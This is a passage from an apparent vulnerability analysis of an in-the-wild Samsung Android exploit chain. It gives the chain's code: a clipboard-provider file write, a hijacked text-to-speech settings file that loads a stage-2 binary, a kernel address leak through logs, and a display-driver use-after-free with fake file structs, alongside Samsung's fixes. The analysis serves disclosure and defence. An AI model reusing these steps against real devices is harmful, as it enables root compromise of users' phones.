| public Uri insert(Uri uri, ContentValues values) {  long row = this.database.insert(TABLE\_NAME, "", values);  if (row > 0) {  Uri newUri = ContentUris.withAppendedId(CONTENT\_URI, row);  getContext().getContentResolver().notifyChange(newUri, null);  return newUri;  }  throw new SQLException("Fail to add a new record into " + uri);  } |
| --- |

The function above is the vulnerable insert() method in com.android.server.semclipboard.SemClipboardProvider. There is no access control included in this function so any app, including the untrusted\_app SELinux context, can modify the \_data column directly. By calling insert, an app can open files via the system server that it wouldn’t usually be able to open on its own.

The exploit triggered the vulnerability with the following code from an untrusted application on the device. This code returned a raw file descriptor.

| ContentValues vals = new ContentValues();  vals.put("\_data", "/data/system/users/0/newFile.bin");  URI semclipboard\_uri = URI.parse("content://com.sec.android.semclipboardprovider")  ContentResolver resolver = getContentResolver();  URI newFile\_uri = resolver.insert(semclipboard\_uri, vals);  return resolver.openFileDescriptor(newFile\_uri, "w").getFd(); |
| --- |

Let’s walk through what is happening line by line:

1. Create a [ContentValues](https://developer.android.com/reference/android/content/ContentValues) object. This holds the key, value pair that the caller wants to insert into a provider’s database table. The key is the column name and the value is the row entry.
2. Set the ContentValues object: the key is set to “\_data” and the value to an arbitrary file path, controlled by the exploit.
3. Get the URI to access the semclipboardprovider. This is set in the SemClipboardProvider class.
4. Get the [ContentResolver](https://developer.android.com/reference/android/content/ContentResolver) object that allows apps access to ContentProviders.
5. Call insert on the semclipboardprovider with our key-value pair.
6. Open the file that was passed in as the value and return the raw file descriptor. openFileDescriptor calls the content provider’s openFile, which in this case simply calls openFileHelper.

The exploit wrote their next stage binary to the directory /data/system/users/0/. The dropped file will have an SELinux context of users\_system\_data\_file. Normal untrusted\_app’s don’t have access to open or create users\_system\_data\_file files so in this case they are proxying the open through system\_server who can open users\_system\_data\_file. While untrusted\_app can’t open users\_system\_data\_file, it can read and write to users\_system\_data\_file. Once the clipboard content provider opens the file and passess the fd to the calling process, the calling process can now read and write to it.

The exploit first uses this fd to write their next stage ELF file onto the file system. The contents for the stage 2 ELF were embedded within the original sample.

This vulnerability is triggered three more times throughout the chain as we’ll see below.

## Fixing the vulnerability

To fix the vulnerability, Samsung added access checks to the functions in the SemClipboardProvider. The insert method now checks if the PID of the calling process is UID 1000, meaning that it is already also running with system privileges.

| public Uri insert(Uri uri, ContentValues values) {  if (Binder.getCallingUid() != 1000) {  Log.e(TAG, "Fail to insert image clip uri. blocked the access of package : " + getContext().getPackageManager().getNameForUid(Binder.getCallingUid()));  return null;  }  long row = this.database.insert(TABLE\_NAME, "", values);  if (row > 0) {  Uri newUri = ContentUris.withAppendedId(CONTENT\_URI, row);  getContext().getContentResolver().notifyChange(newUri, null);  return newUri;  }  throw new SQLException("Fail to add a new record into " + uri);  } |
| --- |

## Executing the stage 2 ELF

The exploit has now written its stage 2 binary to the file system, but how do they load it outside of their current app sandbox? Using the Samsung Text to Speech application (SamsungTTS.apk).

The [Samsung Text to Speech application (com.samsung.SMT)](https://galaxystore.samsung.com/detail/com.samsung.SMT?langCd=en) is a pre-installed system app running on Samsung devices. It is also running as the system UID, though as a slightly less privileged SELinux context, system\_app rather than system\_server. There has been at least one previously public vulnerability where this app was used[to gain code execution as system](https://blog.flanker017.me/text-to-speech-speaks-pwned/). What’s different this time though is that the exploit doesn’t need another vulnerability; instead it reuses the stage 1 vulnerability in the clipboard to arbitrarily write files on the file system.

Older versions of the SamsungTTS application stored the file path for their engine in their Settings files. When a service in the application was started, it obtained the path from the Settings file and would load that file path as a native library using the [System.load](https://developer.android.com/reference/java/lang/System#load(java.lang.String)) API.

The exploit takes advantage of this by using the stage 1 vulnerability to write its file path to the Settings file and then starting the service which will then load its stage 2 executable file as system UID and system\_app SELinux context.

To do this, the exploit uses the stage 1 vulnerability to write the following contents to two different files: /data/user\_de/0/com.samsung.SMT/shared\_prefs/SamsungTTSSettings.xml and /data/data/com.samsung.SMT/shared\_prefs/SamsungTTSSettings.xml. Depending on the version of the phone and application, the SamsungTTS app uses these 2 different paths for its Settings files.

| <?xml version='1.0' encoding='utf-8' standalone='yes' ?>  <map>  <string name=\"eng-USA-Variant Info\">f00</string>\n"  <string name=\"SMT\_STUBCHECK\_STATUS\">STUB\_SUCCESS</string>\n"  <string name=\"SMT\_LATEST\_INSTALLED\_ENGINE\_PATH\">/data/system/users/0/newFile.bin</string>\n"  </map> |
| --- |

The SMT\_LATEST\_INSTALLED\_ENGINE\_PATH is the file path passed to System.load(). To initiate the process of the system loading, the exploit stops and restarts the SamsungTTSService by sending two intents to the application. The SamsungTTSService then initiates the load and the stage 2 ELF begins executing as the system user in the system\_app SELinux context.

The exploit sample is from at least November 2020. As of November 2020, some devices had a version of the SamsungTTS app that did this arbitrary file loading while others did not. App versions 3.0.04.14 and before included the arbitrary loading capability. It seems like devices released on Android 10 (Q) were released with the updated version of the SamsungTTS app which did not load an ELF file based on the path in the settings file. For example, the A51 device that launched in late 2019 on Android 10 launched with version 3.0.08.18 of the SamsungTTS app, which does not include the functionality that would load the ELF.

Phones released on Android P and earlier seemed to have a version of the app pre-3.0.08.18 which does load the executable up through December 2020. For example, the SamsungTTS app from [this A50 device](https://www.sammobile.com/samsung/galaxy-a50/firmware/SM-A505F/XID/download/A505FDDS5BTJA/517463/) on the November 2020 security patch level was 3.0.03.22, which did load from the Settings file.

Once the ELF file is loaded via the System.load api, it begins executing. It includes two additional exploits to gain kernel read and write privileges as the root user.

# Vulnerability #2 - task\_struct and sys\_call\_table address leak

Once the second stage ELF is running (and as system), the exploit then continues. The second vulnerability (CVE-2021-25369) used by the chain is an information leak to leak the address of the task\_struct and sys\_call\_table. The leaked sys\_call\_table address is used to defeat KASLR. The addr\_limit pointer, which is used later to gain arbitrary kernel read and write, is calculated from the leaked task\_struct address.

The vulnerability is in the access permissions of a custom Samsung logging file: /data/log/sec\_log.log.

[![Screenshot of the CVE-2021-25369 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log  Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png "Screenshot of the CVE-2021-25369 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log  Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png)

The exploit abused a WARN\_ON in order to leak the two kernel addresses and therefore break ASLR. WARN\_ON is intended to only be used in situations where a kernel bug is detected because it prints a full backtrace, including stack trace and register values, to the kernel logging buffer, /dev/kmsg.

| oid \_\_warn(const char \*file, int line, void \*caller, unsigned taint,  struct pt\_regs \*regs, struct warn\_args \*args)  {  disable\_trace\_on\_warning();    pr\_warn("------------[ cut here ]------------\n");    if (file)  pr\_warn("WARNING: CPU: %d PID: %d at %s:%d %pS\n",  raw\_smp\_processor\_id(), current->pid, file, line,  caller);  else  pr\_warn("WARNING: CPU: %d PID: %d at %pS\n",  raw\_smp\_processor\_id(), current->pid, caller);    if (args)  vprintk(args->fmt, args->args);    if (panic\_on\_warn) {  /\*  \* This thread may hit another WARN() in the panic path.  \* Resetting this prevents additional WARN() from panicking the  \* system on this thread.  Other threads are blocked by the  \* panic\_mutex in panic().  \*/  panic\_on\_warn = 0;  panic("panic\_on\_warn set ...\n");  }    print\_modules();    dump\_stack();    print\_oops\_end\_marker();    /\* Just a warning, don't kill lockdep. \*/  add\_taint(taint, LOCKDEP\_STILL\_OK);  } |
| --- |

On Android, the ability to read from kmsg is scoped to privileged users and contexts. While kmsg is readable by system\_server, it is not readable from the system\_app context, which means it’s not readable by the exploit.

| a51:/ $ ls -alZ /dev/kmsg  crw-rw---- 1 root system u:object\_r:kmsg\_device:s0 1, 11 2022-10-27 21:48 /dev/kmsg    $ sesearch -A -s system\_server -t kmsg\_device -p read precompiled\_sepolicy  allow domain dev\_type:lnk\_file { getattr ioctl lock map open read };  allow system\_server kmsg\_device:chr\_file { append getattr ioctl lock map open read write }; |
| --- |

Samsung however has added a custom logging feature that copies kmsg to the sec\_log. The sec\_log is a file found at /data/log/sec\_log.log.

The WARN\_ON that the exploit triggers is in the Mali GPU graphics driver provided by ARM. ARM replaced the WARN\_ON with a call to the more appropriate helper pr\_warn in [release BX304L01B-SW-99002-r21p0-01rel1 in February 2020](https://developer.arm.com/downloads/-/mali-drivers/bifrost-kernel). However, the A51 (SM-A515F) and A50 (SM-A505F)  still used a vulnerable version of the driver (r19p0) as of January 2021.

| /\*\*  \* kbasep\_vinstr\_hwcnt\_reader\_ioctl() - hwcnt reader's ioctl.  \* @filp:   Non-NULL pointer to file structure.  \* @cmd:    User command.  \* @arg:    Command's argument.  \*  \* Return: 0 on success, else error code.  \*/  static long kbasep\_vinstr\_hwcnt\_reader\_ioctl(  struct file \*filp,  unsigned int cmd,  unsigned long arg)  {  long rcode;  struct kbase\_vinstr\_client \*cli;    if (!filp || (\_IOC\_TYPE(cmd) != KBASE\_HWCNT\_READER))  return -EINVAL;    cli = filp->private\_data;  if (!cli)  return -EINVAL;    switch (cmd) {  case KBASE\_HWCNT\_READER\_GET\_API\_VERSION:  rcode = put\_user(HWCNT\_READER\_API, (u32 \_\_user \*)arg);  break;  case KBASE\_HWCNT\_READER\_GET\_HWVER:  rcode = kbasep\_vinstr\_hwcnt\_reader\_ioctl\_get\_hwver(  cli, (u32 \_\_user \*)arg);  break;  case KBASE\_HWCNT\_READER\_GET\_BUFFER\_SIZE:  rcode = put\_user(  (u32)cli->vctx->metadata->dump\_buf\_bytes,  (u32 \_\_user \*)arg);  break;    [...]    default:  WARN\_ON(true);  rcode = -EINVAL;  break;  }    return rcode;  } |
| --- |

Specifically the WARN\_ON is in the function kbase\_vinstr\_hwcnt\_reader\_ioctl. To trigger, the exploit only needs to call an invalid ioctl number for the HWCNT driver and the WARN\_ON will be hit. The exploit makes two ioctl calls: the first is the Mali driver’s HWCNT\_READER\_SETUP ioctl to initialize the hwcnt driver and be able to call ioctl’s and then to the hwcnt ioctl target with an invalid ioctl number: 0xFE.

| hwcnt\_fd = ioctl(dev\_mali\_fd, 0x40148008, &v4);  ioctl(hwcnt\_fd, 0x4004BEFE, 0); |
| --- |

To trigger the vulnerability the exploit sends an invalid ioctl to the HWCNT driver a few times and then triggers a bug report by calling:

| setprop dumpstate.options bugreportfull;  setprop ctl.start bugreport; |
| --- |

In Android, the property ctl.start starts a service that is defined in init. On the targeted Samsung devices, the SELinux policy for who has access to the ctl.start property is much more permissive than AOSP’s policy. Most notably in this exploit’s case, system\_app has access to set ctl\_start and thus initiate the bugreport.

| allow at\_distributor ctl\_start\_prop:file { getattr map open read };  allow at\_distributor ctl\_start\_prop:property\_service set;  allow bootchecker ctl\_start\_prop:file { getattr map open read };  allow bootchecker ctl\_start\_prop:property\_service set;  allow dumpstate property\_type:file { getattr map open read };  allow hal\_keymaster\_default ctl\_start\_prop:file { getattr map open read };  allow hal\_keymaster\_default ctl\_start\_prop:property\_service set;  allow ikev2\_client ctl\_start\_prop:file { getattr map open read };  allow ikev2\_client ctl\_start\_prop:property\_service set;  allow init property\_type:file { append create getattr map open read relabelto rename setattr unlink write };  allow init property\_type:property\_service set;  allow keystore ctl\_start\_prop:file { getattr map open read };  allow keystore ctl\_start\_prop:property\_service set;  allow mediadrmserver ctl\_start\_prop:file { getattr map open read };  allow mediadrmserver ctl\_start\_prop:property\_service set;  allow multiclientd ctl\_start\_prop:file { getattr map open read };  allow multiclientd ctl\_start\_prop:property\_service set;  allow radio ctl\_start\_prop:file { getattr map open read };  allow radio ctl\_start\_prop:property\_service set;  allow shell ctl\_start\_prop:file { getattr map open read };  allow shell ctl\_start\_prop:property\_service set;  allow surfaceflinger ctl\_start\_prop:file { getattr map open read };  allow surfaceflinger ctl\_start\_prop:property\_service set;  allow system\_app ctl\_start\_prop:file { getattr map open read };  allow system\_app ctl\_start\_prop:property\_service set;  allow system\_server ctl\_start\_prop:file { getattr map open read };  allow system\_server ctl\_start\_prop:property\_service set;  allow vold ctl\_start\_prop:file { getattr map open read };  allow vold ctl\_start\_prop:property\_service set;  allow wlandutservice ctl\_start\_prop:file { getattr map open read };  allow wlandutservice ctl\_start\_prop:property\_service set; |
| --- |

The bugreport service is defined in /system/etc/init/dumpstate.rc:

| service bugreport /system/bin/dumpstate -d -p -B -z \  -o /data/user\_de/0/com.android.shell/files/bugreports/bugreport  class main  disabled  oneshot |
| --- |

The bugreport service in dumpstate.rc is a Samsung-specific customization. The [AOSP version of](https://cs.android.com/android/platform/superproject/%2B/master%3Aframeworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject) [dumpstate.rc](https://cs.android.com/android/platform/superproject/%2B/master%3Aframeworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject) doesn’t include this service.

The Samsung version of the dumpstate (/system/bin/dumpstate) binary then copies everything from /proc/sec\_log to /data/log/sec\_log.log as shown in the pseudo-code below. This is the first few lines of the dumpstate() function within the dumpstate binary. The dump\_sec\_log (symbols included within the binary) function copies everything from the path provided in argument two to the path provided in argument three.

| \_ReadStatusReg(ARM64\_SYSREG(3, 3, 13, 0, 2));  LOBYTE(s) = 18;  v650[0] = 0LL;  s\_8 = 17664LL;  \*(char \*\*)((char \*)&s + 1) = \*(char \*\*)"DUMPSTATE";  DurationReporter::DurationReporter(v636, (\_\_int64)&s, 0);  if ( ((unsigned \_\_int8)s & 1) != 0 )  operator delete(v650[0]);  dump\_sec\_log("SEC LOG", "/proc/sec\_log", "/data/log/sec\_log.log"); |
| --- |

After starting the bugreport service, the exploit uses [inotify](https://man7.org/linux/man-pages/man7/inotify.7.html) to monitor for IN\_CLOSE\_WRITE events in the /data/log/ directory. IN\_CLOSE\_WRITE triggers when a file that was opened for writing is closed. So this watch will occur when dumpstate is finished writing to sec\_log.log.

An example of the sec\_log.log file contents generated after hitting the WARN\_ON statement is shown below. The exploit combs through the file contents looking for two values on the stack that are at address \*b60 and \*bc0: the task\_struct and the sys\_call\_table address.

| <4>[90808.635627]  [4:    poc:25943] ------------[ cut here ]------------  <4>[90808.635654]  [4:    poc:25943] WARNING: CPU: 4 PID: 25943 at drivers/gpu/arm/b\_r19p0/mali\_kbase\_vinstr.c:992 kbasep\_vinstr\_hwcnt\_reader\_ioctl+0x36c/0x664  <4>[90808.635663]  [4:    poc:25943] Modules linked in:  <4>[90808.635675]  [4:    poc:25943] CPU: 4 PID: 25943 Comm: poc Tainted: G        W       4.14.113-20034833 #1  <4>[90808.635682]  [4:    poc:25943] Hardware name: Samsung BEYOND1LTE EUR OPEN 26 board based on EXYNOS9820 (DT)  <4>[90808.635689]  [4:    poc:25943] Call trace:  <4>[90808.635701]  [4:    poc:25943] [<0000000000000000>] dump\_backtrace+0x0/0x280  <4>[90808.635710]  [4:    poc:25943] [<0000000000000000>] show\_stack+0x18/0x24  <4>[90808.635720]  [4:    poc:25943] [<0000000000000000>] dump\_stack+0xa8/0xe4  <4>[90808.635731]  [4:    poc:25943] [<0000000000000000>] \_\_warn+0xbc/0x164tv  <4>[90808.635738]  [4:    poc:25943] [<0000000000000000>] report\_bug+0x15c/0x19c  <4>[90808.635746]  [4:    poc:25943] [<0000000000000000>] bug\_handler+0x30/0x8c  <4>[90808.635753]  [4:    poc:25943] [<0000000000000000>] brk\_handler+0x94/0x150  <4>[90808.635760]  [4:    poc:25943] [<0000000000000000>] do\_debug\_exception+0xc8/0x164  <4>[90808.635766]  [4:    poc:25943] Exception stack(0xffffff8014c2bb40 to 0xffffff8014c2bc80)  <4>[90808.635775]  [4:    poc:25943] bb40: ffffffc91b00fa40 000000004004befe 0000000000000000 0000000000000000  <4>[90808.635781]  [4:    poc:25943] bb60: ffffffc061b65800 000000000ecc0408 000000000000000a 000000000000000a  <4>[90808.635789]  [4:    poc:25943] bb80: 000000004004be30 000000000000be00 ffffffc86b49d700 000000000000000b  <4>[90808.635796]  [4:    poc:25943] bba0: ffffff8014c2bdd0 0000000080000000 0000000000000026 0000000000000026  <4>[90808.635802]  [4:    poc:25943] bbc0: ffffff8008429834 000000000041bd50 0000000000000000 0000000000000000  <4>[90808.635809]  [4:    poc:25943] bbe0: ffffffc88b42d500 ffffffffffffffea ffffffc96bda5bc0 0000000000000004  <4>[90808.635816]  [4:    poc:25943] bc00: 0000000000000000 0000000000000124 000000000000001d ffffff8009293000  <4>[90808.635823]  [4:    poc:25943] bc20: ffffffc89bb6b180 ffffff8014c2bdf0 ffffff80084294bc ffffff8014c2bd80  <4>[90808.635829]  [4:    poc:25943] bc40: ffffff800885014c 0000000020400145 0000000000000008 0000000000000008  <4>[90808.635836]  [4:    poc:25943] bc60: 0000007fffffffff 0000000000000001 ffffff8014c2bdf0 ffffff800885014c  <4>[90808.635843]  [4:    poc:25943] [<0000000000000000>] el1\_dbg+0x18/0x74 |
| --- |

The file /data/log/sec\_log.log has the SELinux context dumplog\_data\_file which is widely accessible to many apps as shown below. The exploit is currently running within the SamsungTTS app which is the system\_app SELinux context. While the exploit does not have access to /dev/kmsg due to SELinux access controls, it can access the same contents when they are copied to the sec\_log.log which has more permissive access.

| $ sesearch -A -t dumplog\_data\_file -c file -p open precompiled\_sepolicy | grep \_app    allow aasa\_service\_app dumplog\_data\_file:file { getattr ioctl lock map open read };    allow dualdar\_app dumplog\_data\_file:file { append create getattr ioctl lock map open read rename setattr unlink write };    allow platform\_app dumplog\_data\_file:file { append create getattr ioctl lock map open read rename setattr unlink write };    allow priv\_app dumplog\_data\_file:file { append create getattr ioctl lock map open read rename setattr unlink write };    allow system\_app dumplog\_data\_file:file { append create getattr ioctl lock map open read rename setattr unlink write };    allow teed\_app dumplog\_data\_file:file { append create getattr ioctl lock map open read rename setattr unlink write };    allow vzwfiltered\_untrusted\_app dumplog\_data\_file:file { getattr ioctl lock map open read }; |
| --- |

## Fixing the vulnerability

There were a few different changes to address this vulnerability:

* Modified the dumpstate binary on the device – As of the March 2021 update, dumpstate no longer writes to /data/log/sec\_log.log.
* Removed the bugreport service from dumpstate.rc.

In addition there were a few changes made earlier in 2020 that when included would prevent this vulnerability in the future:

* As mentioned above, in February 2020 ARM had released version r21p0 of the Mali driver which had replaced the WARN\_ON with the more appropriate pr\_warn which does not log a full backtrace. The March 2021 Samsung firmware included updating from version r19p0 of the Mali driver to r26p0 which used pr\_warn instead of WARN\_ON.
* In April 2020, [upstream Linux made a change](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/arm64/kernel/traps.c?h=linux-4.14.y&id=6dc0256f802be6bc783fb9542affb48d267f592c) to no longer include raw stack contents in kernel backtraces.

# Vulnerability #3 - Arbitrary kernel read and write

The final vulnerability in the chain (CVE-2021-25370) is a use-after-free of a file struct in the Display and Enhancement Controller (DECON) Samsung driver for the Display Processing Unit (DPU). According to the [upstream commit message](https://patchwork.kernel.org/project/dri-devel/patch/1417097460-18403-1-git-send-email-ajaykumar.rs%40samsung.com/), DECON is responsible for creating the video signals from pixel data. This vulnerability is used to gain arbitrary kernel read and write access.

[![Screenshot of the CVE-2021-25370 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver  Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1200/image1.png "Screenshot of the CVE-2021-25370 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver  Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1213/image1.png)

## Find the PID of android.hardware.graphics.composer

To be able to trigger the vulnerability the exploit needs an fd for the driver in order to send ioctl calls. To find the fd, the exploit has to to iterate through the fd proc directory for the target process. Therefore the exploit first needs to find the PID for the graphics process.

The exploit connects to [LogReader which listens at](https://cs.android.com/android/platform/superproject/%2B/586af4e17de6b8bf665dc2a1bb61f46fddb326f7%3Asystem/logging/logd/main.cpp;l=256) /dev/socket/logdr. When a client connects to LogReader, LogReader writes the log contents back to the client. The exploit then configures LogReader to send it logs for the main log buffer (0), system log buffer (3), and the crash log buffer (4) by writing back to LogReader via the socket:

| stream lids=0,3,4 |
| --- |

The exploit then monitors the log contents until it sees the words ‘display’ or ‘SDM’. Once it finds a ‘display’ or ‘SDM’ log entry, the exploit then reads the PID from that log entry.

Now it has the PID of android.hardware.graphics.composer, where [android.hardware.graphics composer is the Hardware Composer HAL](https://source.android.com/docs/core/graphics/hwc).

Next the exploit needs to find the full file path for the DECON driver. The full file path can exist in a few different places on the filesystem so to find which one it is on this device, the exploit iterates through the /proc/<PID>/fd/ directory looking for any file path that contains “graphics/fb0”, the DECON driver. It uses readlink to find the file path for each /proc/<PID>/fd/<fd>. The semclipboard vulnerability (vulnerability #1) is then used to get the raw file descriptor for the DECON driver path.

## Triggering the Use-After-Free

The vulnerability is in the decon\_set\_win\_config function in the Samsung DECON driver. The vulnerability is a relatively common use-after-free pattern in kernel drivers. First, the driver acquires an fd for a fence. This fd is associated with a file pointer in a sync\_file struct, specifically the file member. A “[fence](https://www.kernel.org/doc/html/latest/driver-api/sync_file.html)” is used for sharing buffers and synchronizing access between drivers and different processes.

| /\*\*  \* struct sync\_file - sync file to export to the userspace  \* @file:               file representing this fence  \* @sync\_file\_list:     membership in global file list  \* @wq:                 wait queue for fence signaling  \* @fence:              fence with the fences in the sync\_file  \* @cb:                 fence callback information  \*/  struct sync\_file {  struct file             \*file;  /\*\*  \* @user\_name:  \*  \* Name of the sync file provided by userspace, for merged fences.  \* Otherwise generated through driver callbacks (in which case the  \* entire array is 0).  \*/  char                    user\_name[32];  #ifdef CONFIG\_DEBUG\_FS  struct list\_head        sync\_file\_list;  #endif    wait\_queue\_head\_t       wq;  unsigned long           flags;    struct dma\_fence        \*fence;  struct dma\_fence\_cb cb;  }; |
| --- |

The driver then calls fd\_install on the fd and file pointer, which makes the fd accessible from userspace and transfers ownership of the reference to the fd table. Userspace is able to call close on that fd. If that fd holds the only reference to the file struct, then the file struct is freed. However, the driver continues to use the pointer to that freed file struct.

| static int decon\_set\_win\_config(struct decon\_device \*decon,  struct decon\_win\_config\_data \*win\_data)  {  int num\_of\_window = 0;  struct decon\_reg\_data \*regs;  struct sync\_file \*sync\_file;  int i, j, ret = 0;    [...]    num\_of\_window = decon\_get\_active\_win\_count(decon, win\_data);  if (num\_of\_window) {  win\_data->retire\_fence = decon\_create\_fence(decon, &sync\_file);  if (win\_data->retire\_fence < 0)  goto err\_prepare;  } else {    [...]    if (num\_of\_window) {  fd\_install(win\_data->retire\_fence, sync\_file->file);  decon\_create\_release\_fences(decon, win\_data, sync\_file);  #if !defined(CONFIG\_SUPPORT\_LEGACY\_FENCE)  regs->retire\_fence = dma\_fence\_get(sync\_file->fence);  #endif  }    [...]    return ret;  } |
| --- |

In this case, decon\_set\_win\_config acquires the fd for retire\_fence in decon\_create\_fence.

| int decon\_create\_fence(struct decon\_device \*decon, struct sync\_file \*\*sync\_file)  {  struct dma\_fence \*fence;  int fd = -EMFILE;    fence = kzalloc(sizeof(\*fence), GFP\_KERNEL);  if (!fence)  return -ENOMEM;    dma\_fence\_init(fence, &decon\_fence\_ops, &decon->fence.lock,  decon->fence.context,  atomic\_inc\_return(&decon->fence.timeline));    \*sync\_file = sync\_file\_create(fence);  dma\_fence\_put(fence);  if (!(\*sync\_file)) {  decon\_err("%s: failed to create sync file\n", \_\_func\_\_);  return -ENOMEM;  }    fd = decon\_get\_valid\_fd();  if (fd < 0) {  decon\_err("%s: failed to get unused fd\n", \_\_func\_\_);  fput((\*sync\_file)->file);  }    return fd;  } |
| --- |

The function then calls fd\_install(win\_data->retire\_fence, sync\_file->file) which means that userspace can now access the fd. When fd\_install is called, another reference is not taken on the file so when userspace calls close(fd), the only reference on the file is dropped and the file struct is freed. The issue is that after calling fd\_install the function then calls decon\_create\_release\_fences(decon, win\_data, sync\_file) with the same sync\_file that contains the pointer to the freed file struct.

| void decon\_create\_release\_fences(struct decon\_device \*decon,  struct decon\_win\_config\_data \*win\_data,  struct sync\_file \*sync\_file)  {  int i = 0;    for (i = 0; i < decon->dt.max\_win; i++) {  int state = win\_data->config[i].state;  int rel\_fence = -1;    if (state == DECON\_WIN\_STATE\_BUFFER) {  rel\_fence = decon\_get\_valid\_fd();  if (rel\_fence < 0) {  decon\_err("%s: failed to get unused fd\n",  \_\_func\_\_);  goto err;  }    fd\_install(rel\_fence, get\_file(sync\_file->file));  }  win\_data->config[i].rel\_fence = rel\_fence;  }  return;  err:  while (i-- > 0) {  if (win\_data->config[i].state == DECON\_WIN\_STATE\_BUFFER) {  put\_unused\_fd(win\_data->config[i].rel\_fence);  win\_data->config[i].rel\_fence = -1;  }  }  return;  } |
| --- |

decon\_create\_release\_fences gets a new fd, but then associates that new fd with the freed file struct, sync\_file->file, in the call to fd\_install.

When decon\_set\_win\_config returns, retire\_fence is the closed fd that points to the freed file struct and rel\_fence is the open fd that points to the freed file struct.

### Fixing the vulnerability

Samsung fixed this use-after-free in March 2021 as CVE-2021-25370. The fix was to move the call to fd\_install in decon\_set\_win\_config to the latest possible point in the function after the call to decon\_create\_release\_fences.

| if (num\_of\_window) {  -               fd\_install(win\_data->retire\_fence, sync\_file->file);  decon\_create\_release\_fences(decon, win\_data, sync\_file);  #if !defined(CONFIG\_SUPPORT\_LEGACY\_FENCE)  regs->retire\_fence = dma\_fence\_get(sync\_file->fence);  #endif  }    decon\_hiber\_block(decon);    mutex\_lock(&decon->up.lock);  list\_add\_tail(&regs->list, &decon->up.list);  +       atomic\_inc(&decon->up.remaining\_frame);  decon->update\_regs\_list\_cnt++;  +       win\_data->extra.remained\_frames = atomic\_read(&decon->up.remaining\_frame);    mutex\_unlock(&decon->up.lock);  kthread\_queue\_work(&decon->up.worker, &decon->up.work);    +       /\*  +        \* The code is moved here because the DPU driver may get a wrong fd  +        \* through the released file pointer,  +        \* if the user(HWC) closes the fd and releases the file pointer.  +        \*  +        \* Since the user land can use fd from this point/time,  +        \* it can be guaranteed to use an unreleased file pointer  +        \* when creating a rel\_fence in decon\_create\_release\_fences(...)  +        \*/  +       if (num\_of\_window)  +               fd\_install(win\_data->retire\_fence, sync\_file->file);    mutex\_unlock(&decon->lock); |
| --- |

## Heap Grooming and Spray

To groom the heap the exploit first opens and closes 30,000+ files using memfd\_create. Then, the exploit sprays the heap with fake file structs. On this version of the Samsung kernel, the file struct is 0x140 bytes. In these new, fake file structs, the exploit sets four of the members:

| fake\_file.f\_u = 0x1010101;  fake\_file.f\_op = kaddr - 0x2071B0+0x1094E80;  fake\_file.f\_count = 0x7F;  fake\_file.private\_data = addr\_limit\_ptr; |
| --- |

The f\_op member is set to the signalfd\_op for reasons we will cover below in the “Overwriting the addr\_limit” section. kaddr is the address leaked using vulnerability #2 described previously. The addr\_limit\_ptr was calculated by adding 8 to the task\_struct address also leaked using vulnerability #2.

The exploit sprays 25 of these structs across the heap using the MEM\_PROFILE\_ADD ioctl in the Mali driver.

